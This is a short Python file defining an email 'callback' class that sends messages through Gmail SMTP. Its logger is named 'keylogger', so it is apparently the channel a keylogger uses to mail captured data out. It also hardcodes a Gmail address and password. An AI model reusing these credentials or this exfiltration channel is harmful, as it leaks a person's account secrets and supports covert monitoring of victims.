import logging
import smtplib

'''
To use this callback please enable interaction with not-secure applications via google using the link below
Link - https://myaccount.google.com/lesssecureapps
'''

class Email():
	def __init__(self, login = "minovichkov@gmail.com", password = "#Misha_2016##89160123711"):
		# Deal with logging
		logging.basicConfig()
		self.logger = logging.getLogger('keylogger')
		self.logger.setLevel(logging.DEBUG)
		self.login = login
		self.password = password

	def run(self, email, message = "Testing message from Email callback"):
		self.logger.debug("Sending message {} to the email {}".format(message, email))
		server = smtplib.SMTP('smtp.gmail.com', 587)
		server.starttls()
		server.login(self.login, self.password)
		server.sendmail(self.login, email, message)
		server.quit()

if __name__ == "__main__":
	e = Email()
	e.run("testingmypythonscript@gmail.com")